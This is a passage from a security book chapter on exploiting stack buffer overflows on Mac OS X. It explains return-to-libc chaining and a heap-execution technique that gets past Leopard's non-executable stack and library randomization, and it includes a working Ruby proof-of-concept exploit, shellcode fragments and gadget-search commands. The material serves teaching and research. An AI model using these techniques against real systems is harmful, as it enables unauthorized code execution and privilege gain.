uid=502(ddz) gid=20(staff)
groups=20(staff),98(_lpadmin),102(com.apple.sharepoint.group.2),101(com.
apple.sharepoint.group.1)
Program received signal EXC_BAD_ACCESS, Could not access memory.
Reason: KERN_INVALID_ADDRESS at address: 0xfeedface
0xfeedface in ?? ()
(gdb)
You can see that we successfully returned to system(), which executed our com-
mand and then proceeded to take another address from our attack string to return
9955336633cc0077..iinndddd 117755 11//2255//0099 44::4411::4477 PPMM
176 Part III ■ Exploitation
to (0xfeedface). As long as you return to subroutines that take a single parameter,
you can chain together as many subroutine calls as you want using this technique.
You only need to obtain the memory addresses of the functions that you want to
call and pack them and their parameters into your attack string.
There is one serious limitation to returning straight to system(), especially in
a local exploit in Leopard. In Leopard (but not in Tiger), /bin/sh will drop effec-
tive user ID privileges if they do not match the real user ID and if the effective
user ID is less than 100. This is typically the case when exploiting a set-user ID
root executable, so if you return to system, you will gain no privileges, as they
will be dropped by /bin/sh before system() will even execute your command.
One way around this is to call setuid(0) before calling system(); however, there
is a problem with this. Placing a zero value in a buffer-overfl ow attack string is
problematic, as it is also the ASCII string terminator. Rather than attempt to work
around this, we will demonstrate a more general solution in the next section.
Executing the Payload from the Heap
One limitation of the preceding technique is that if you want to call any subrou-
tines that take pointer arguments, you need to be able to calculate or guess the
address of the attack string in memory. A fl exible technique that overcomes the
non-executable stack and Library Randomization, allowing you to execute an
arbitrary existing payload without having to guess volatile memory addresses,
would be ideal. On Mac OS X x86 10.4 and 10.5, Apple has made only the stack
segments truly non-executable, not the other writable memory regions such as
the data and heap segments. Copying the payload to the heap and transferring
control to it there would allow you to use an arbitrary existing payload without
modifi cation. In this section we will describe Dino Dai Zovi’s technique for
overcoming Leopard’s Library Randomization and non-executable stack in an
arbitrary stack-buffer-overfl ow exploit.
To do this, the technique takes advantage of several limitations of Leopard’s
Library Randomization. Although Leopard randomizes the load address of most
shared libraries and frameworks on the system, it notably does not randomize
the base address of the dynamic linker itself, dyld. The dyld executable image is
always loaded at the same base address, 0x8fe00000. In addition, since dyld cannot
depend on any other libraries, it includes the code for any library functions that
it needs within its own text segment. These two properties make it very useful
for return-to-libc-style exploits because they can make use of the standard library
functions at fi xed known locations in dyld’s text segment. With some creativity,
an attacker can take advantage of this to create a return-into-libc attack string that
copies the exploit payload into the heap and executes it directly from there.
One of the most interesting library functions available in dyld’s text segment
is setjmp(). The setjmp() and longjmp() functions are used to implement non-
local transfers of control by saving and restoring the execution environment,
9955336633cc0077..iinndddd 117766 11//2255//0099 44::4411::4477 PPMM
Chapter 7 ■ Exploiting Stack Overflows 177
respectively. In practice, the execution environment is the signal context and
values of the nonvolatile registers. Here are the declarations of the functions on
Mac OS X from /usr/include/setjmp.h and _setjmp.s in the Libc source code.
#include 
typedef int jmp_buf[_JBLEN];
int setjmp(jmp_buf env);
void longjmp(jmp_buf env, int val);
#define JB_FPCW 0
#define JB_MASK 4
#define JB_MXCSR 8
#define JB_EBX 12
#define JB_ONSTACK 16
#define JB_EDX 20
#define JB_EDI 24
#define JB_ESI 28
#define JB_EBP 32
#define JB_ESP 36
#define JB_SS 40
#define JB_EFLAGS 44
#define JB_EIP 48
#define JB_CS 52
#define JB_DS 56
#define JB_ES 60
#define JB_FS 64
#define JB_GS 68
As you can see, the jmp_buf argument to setjmp is just an array of machine
words. The technique is based on returning to the setjmp() function and then
returning within the jmp_buf to execute the values of controlled registers as
machine-code instructions. Since we know which registers’ contents are over-
written with values from our attack string, we can return to known offsets from
the jmp_buf pointer to execute those values as CPU instructions.
We will explain the execute-payload-from-heap stub by following its control
fl ow through each jump. We begin with the fi rst jump, when the vulnerable
function in the target process uses its overwritten return address to return into
the setjmp() subroutine.
Step 1: Return to setjmp()
The stub’s fi rst jump simulates a call to setjmp() with an address of writable
memory somewhere in the target process address space. Again, since dyld is
loaded at a known location, we will use an address of some writable memory
in its data segment for our jmp_buf parameter. After setjmp() executes, it will
pop its return address from our attack string, which is set to the address in our
jmp_buf where the value of the EBP register is stored.
9955336633cc0077..iinndddd 117777 11//2255//0099 44::4411::4477 PPMM
178 Part III ■ Exploitation
Step 2: Return to jmp_buf[JB_EBP]
Most subroutine prologs save the caller’s frame pointer onto the stack. When a
stack buffer overfl ows, it will overwrite the frame pointer before it overwrites
the return address. This means that the value of the EBP register can be speci-
fi ed in the attack string. When the vulnerable program returns from setjmp to
jmp_buf[JB_EBP], it executes a four-byte fragment of chosen machine code, as
shown here:
00000000 90 nop ; Change to int3 to debug
00000001 59 pop eax ; Adjust stack pointer
00000002 61 popa ; Restore all registers
00000003 C3 ret ; Return into next jump
This code fragment executes the popa instruction to restore all register values
from the attack string on the stack. The popa instruction pops successive values
from the stack into the EDI, ESI, and EBP registers, skips one for ESP, and then
pops values into the EBX, EDX, ECX, and EAX registers. Before executing popa,
the fragment executes a single pop instruction to adjust the stack pointer so
that the second code fragment is loaded into the proper registers by the popa
instruction. Finally, it executes a return instruction to execute the next jump,
simulating a call to setjmp() again.
Step 3: Return to setjmp() Again
The second simulated call to setjmp() executes with more controlled registers
due to the fact that the popa instruction loaded all of their values from the
attack string. This call to setjmp() also requires an address of writable memory
in the target address space, but there is no need for it to be different from the
address we used in the fi rst call to setjmp(). Leopard’s setjmp implementation
saves only the nonvolatile general-purpose registers (EBX, EDI, ESI, and EBP),
of which EDI, ESI, and EBP are stored sequentially in the jmp_buf. The attack
string fi lls those registers with machine code in order to execute a 12-byte frag-
ment of chosen machine code.
Just as before, after setjmp() executes, it pops its return address from the attack
string. This time the return address is set to the address of jmp_buf[JB_EDI] to
execute a 12-byte fragment of chosen machine code.
Step 4: Return to jmp_buf[JB_EDI]
On an architecture like x86, where the instruction encoding is extremely space
effi cient, 12 bytes of machine code is enough space to execute a few actions.
The second machine-code fragment loads a pointer to the payload in the attack
9955336633cc0077..iinndddd 117788 11//2255//0099 44::4411::4477 PPMM
Chapter 7 ■ Exploiting Stack Overflows 179
string and stores it on the stack such that it would be used as the fi rst parameter
to the next called subroutine. The value is written directly to the stack instead
of pushing so that it does not overwrite the next return address. The assembly
code for this 12-byte fragment is shown below.
00000000 90 nop ; Set to int3 to debug
00000001 58 pop eax ; Adjust stack pointer
00000002 89E0 mov eax,esp ; Load addr of payload
00000004 83C00C add eax,byte +0xc ; from attack string
00000007 89442408 mov [esp+0x8],eax ; as subr parameter
0000000B C3 ret ; Return to next jump
Step 5: Return to strdup()
The C standard library function strdup() takes a string pointer as an argument,
copies the source string to a newly allocated heap buffer, and returns the newly
allocated copy. In Leopard, unlike the memory used for the stack segment that
is protected by hardware NX, the memory used for the heap segment is execut-
able. The stub uses strdup() to copy an arbitrary payload from the attack string
on the stack into heap memory where it may be freely executed.
Step 6: Return to EAX
After strdup() fi nishes executing, it pops its return address from the attack
string. On the x86 architecture, the return value of a function is passed in the
EAX register. Since the ultimate goal is to execute the payload now stored in the
heap buffer that EAX points to, the stub needs to fi nd a way to transfer control
to the memory that EAX points to. To do this, the stub returns to a register-
indirect jump or call instruction at a known location in memory. Again, since
dyld is always loaded at a known address, we can use one of these instructions
from within it. Later in this chapter, in the section “Finding Useful Instruction
Sequences,” we discuss how to fi nd these instruction sequences and how to
choose a reliable one. By using the address of a register-indirect jump to EAX
for the return address from strdup(), the stub fi nally transfers control into the
actual exploit payload.
Step 7: Execute Payload
At this point the target process will begin executing the exploit payload from the
heap. The stack pointer will point to the original attack string on the stack, which
can be safely overwritten by the payload since it is executing from the heap seg-
ment and does not need to be careful not to overwrite itself in memory.
9955336633cc0077..iinndddd 117799 11//2255//0099 44::4411::4477 PPMM
180 Part III ■ Exploitation
The Complete exec-payload-from-heap Stub
Finally, we will demonstrate the exec-payload-from-heap stub in a simple
exploit. The exploit prints the attack string to its standard output, so it can be
used against smashmystack.x86 with the following command.
% ./smashmystack.x86 `./exec-payload-from-heap.rb`
The exploit is a short Ruby script as shown below.
#!/usr/bin/env ruby
#
# Simple proof-of-concept exploit for smashmystack.x86
# using the exec-payload-from-heap technique.
#
#
# Adjust these depending on dyld version
#
SETJMP = 0x8fe1cea0
JMP_BUF = 0x8fe31f10
STRDUP = 0x8fe1ce17
JMP_EAX = 0xffff13ee
def make_exec_payload_from_heap_stub()
frag0 =
“\x90” + # nop
“\x58” + # pop eax
“\x61” + # popa
“\xc3” # ret
frag1 =
“\x90” + # nop
“\x58” + # pop eax
“\x89\xe0” + # mov eax, esp
“\x83\xc0\x0c” + # add eax, byte +0xc
“\x89\x44\x24\x08” + # mov [esp+0x8], eax
“\xc3” # ret
exec_payload_from_heap_stub =
frag0 +
[SETJMP, JMP_BUF + 32, JMP_BUF].pack(“V3”) +
frag1 +
“X” * 20 +
[SETJMP, JMP_BUF + 24, JMP_BUF, STRDUP,
JMP_EAX].pack(“V5”) +
“X” * 4
end
9955336633cc0077..iinndddd 118800 11//2255//0099 44::4411::4477 PPMM
Chapter 7 ■ Exploiting Stack Overflows 181
#
# The actual payload to execute
#
payload = “\xCC” * 4
# Create the stub
stub = make_exec_payload_from_heap_stub()
# The final attack string with stub and payload
puts “A” * 1032 + stub + payload
Finding Useful Instruction Sequences
Several of the exploitation techniques described in this chapter required the use
of short instruction sequences to transfer execution control to a memory address
contained in a register. This is done to prevent hard-coding volatile stack or heap
memory addresses in an exploit. At the time that the overwritten return address
is used, one or more of the registers may point within the attack string. On
PowerPC, where the stack segment is executable, the exploit can simply return
to the address of a register-indirect, transfer-of-control instruction somewhere
in memory to transfer execution control right back to the attack string. On x86,
where the stack is non-executable, a register-indirect jump instruction is used
in our exec-payload-from-heap stub to transfer execution control to the buffer
returned by strdup().
PowerPC
Now look back at the PowerPC stack exploit from earlier in this chapter. You
used ReportCrash to identify the value of the stack pointer at the time that the
overwritten return address was used, and you used that address to calculate
exactly where your payload would be found on the stack. While that works
well on a single system, variations across systems or invocations may cause that
stack address to change. Your exploit would be more robust if you could fi nd a
way to transfer control indirectly to your attack string. If you look back at the
ReportCrash thread state dump, you can see that r26 points to 160 bytes past the
stack pointer, which is within memory that you can overwrite with your attack
string. A sequence of instructions that effectively transfers control to the address
in r26 would allow you to not depend on any hard-coded memory addresses in
your exploit, which is often necessary for remote exploits. You basically need to
fi nd a sequence of instructions that matches one of the following patterns:
mtspr ctr, r26
…
bctr
9955336633cc0077..iinndddd 118811 11//2255//0099 44::4411::4477 PPMM
182 Part III ■ Exploitation
or
mtspr lr, r26
…
blr
The fi rst sequence moves a register value into the control register and branches
to it; the second moves a register value into the link register and branches to it. In
the control-register case, a branch with link instruction (bctrl) would also work.
Since dyld is always loaded at the same address in memory, you should begin
your search for useful instruction sequences there. You can use a decidedly
low-tech technique to search for instruction sequences: a disassembler and
grep. A fancier technique is not necessary. The following command will search
for any sequences of fi ve instructions that begin with r26 being moved into the
control or link register.
/usr/bin/otool -tv /usr/lib/dyld | grep -E -A 5 ‘mt(spr|lr).*r26’
All you need to do is look through the output to fi nd a sequence that executes
a bctr or blr with the value from r26. In this instance, the fi rst match suffi ces.
8fe1e7b4 mtspr ctr,r26
8fe1e7b8 or r3,r29,r29
8fe1e7bc or r12,r26,r26
8fe1e7c0 bctrl
You can use this value in your attack string instead of using the hard-coded
stack memory address for the lr register by changing the value for lr to the
following:
lr = [0x8fe1e7b4].pack(‘N’) # r26->pc in dyld-96.2, 10.5.2
This makes the values in your attack string dependent only on the version
of dyld, which usually is changed in each Mac OS X software update, but not
always. More importantly, by making your attack string dependent only on the
target’s operating-system release, your exploit will be reliable enough for a remote
exploit. Since a failed exploit may often crash the target application, you may
only get one shot, so guessing memory addresses is not usually an option.
x86
The x86 architecture is much more fl exible than the PowerPC architecture in
many regards. Whereas the PowerPC architecture requires instructions to be
word-aligned, the x86 architecture has no such alignment requirement. In addi-
tion, the instructions on x86 can be as short as a single byte, so it is even possible
9955336633cc0077..iinndddd 118822 11//2255//0099 44::4411::4477 PPMM
Chapter 7 ■ Exploiting Stack Overflows 183
to fi nd a useful sequence of two byte-length instructions in a library’s data seg-
ment or other unexpected places in the target process’s address space.
Again you should limit your search to memory regions that are loaded at
constant locations. In addition to dyld, which has been used extensively in this
chapter for useful memory addresses, there is another useful region of memory
that is always loaded at the same address. Near the end of addressable memory
there is a special segment called the commpage that contains specially optimized
implementations of common library functions. These common memory pages
are accessible from both the kernel and every user process. These qualities make
it an ideal place for fi nding stable, useful instruction sequences.
In order to easily search through it, you can use gdb to dump the contents of
the commpage to a fi le. This is necessary because the commpage is not loaded
from a library on disk, but rather copied out of the kernel text segment itself.
You can do this with the dump memory command while you are debugging
any running process. The dump memory command takes a fi le name, start
address, and end address. In the following code you use the addresses for the